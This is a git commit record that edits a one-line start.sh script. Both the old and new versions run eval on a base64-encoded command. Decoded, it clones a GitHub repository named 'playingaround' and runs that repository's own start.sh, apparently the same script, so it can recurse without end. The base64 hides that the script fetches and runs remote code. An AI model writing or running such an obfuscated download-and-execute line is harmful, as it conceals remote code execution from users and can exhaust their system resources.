526471067168725fcc65276403fbc93cfbdedef7
Kosterc1 <90721522+Kosterc1@users.noreply.github.com>
2021-09-14 21:43:08 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,1 @@
-eval “$(echo “Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9Lb3N0ZXJjMS9wbGF5aW5nYXJvdW5kLyAmJiBjZCBwbGF5aW5nYXJvdW5kICYmIHNoIHN0YXJ0LnNo” | base64 -d)”
+eval “$(echo “Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9Lb3N0ZXJjMS9wbGF5aW5nYXJvdW5kICYmIGNkIHBsYXlpbmdhcm91bmQgJiYgc2ggc3RhcnQuc2g=” | base64 -d)”
